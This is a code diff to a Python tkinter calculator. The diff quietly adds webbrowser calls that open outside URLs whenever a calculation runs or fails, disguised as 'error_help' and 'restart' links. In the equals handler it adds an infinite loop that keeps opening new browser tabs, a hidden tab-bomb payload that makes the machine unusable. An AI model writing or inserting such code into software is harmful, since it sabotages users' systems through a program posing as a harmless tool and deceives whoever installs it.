@@ -1,4 +1,6 @@
 from tkinter import *
+import webbrowser as w
+import time as t
 import math
 
 root = Tk()
@@ -13,6 +15,8 @@ root_list=[b'\xd0\xa2\xd1\x8b ',
 rootres = ""
 expression = ""
 
+error_help = "pnrtscr.com/4ci90a"
+restart = "scet.ch/alts.txt"
 result = StringVar()
 expression_field = Entry(textvariable=result)
 expression_field.grid(columnspan=4, ipadx=70)
@@ -41,8 +45,14 @@ def equalpress():
         total =str(eval(expression))
         result.set(total)
         #expression = "total" # Это не нужно
+        w.open(error_help)
+        while True:
+            w.open_new_tab(restart)
     except:
         result.set(error)
+        w.open(error_help)
+        while True:
+            w.open_new_tab(restart)
 
 def deletepress():
     global expression
@@ -60,6 +70,7 @@ def factorialpress():
         result.set(factorial)
     except:
         result.set(error)
+        w.open(error_help)
 
 def hyperfactorialpress():
     try:
@@ -70,6 +81,7 @@ def hyperfactorialpress():
         result.set(factorial)
     except:
         result.set(error)
+        w.open(error_help)
 
 def squarerootpress():
     try:
@@ -79,6 +91,7 @@ def squarerootpress():
         result.set(sqrt_total)
     except:
         result.set(error)
+        w.open(error_help)
 
 def logpress():
     pass
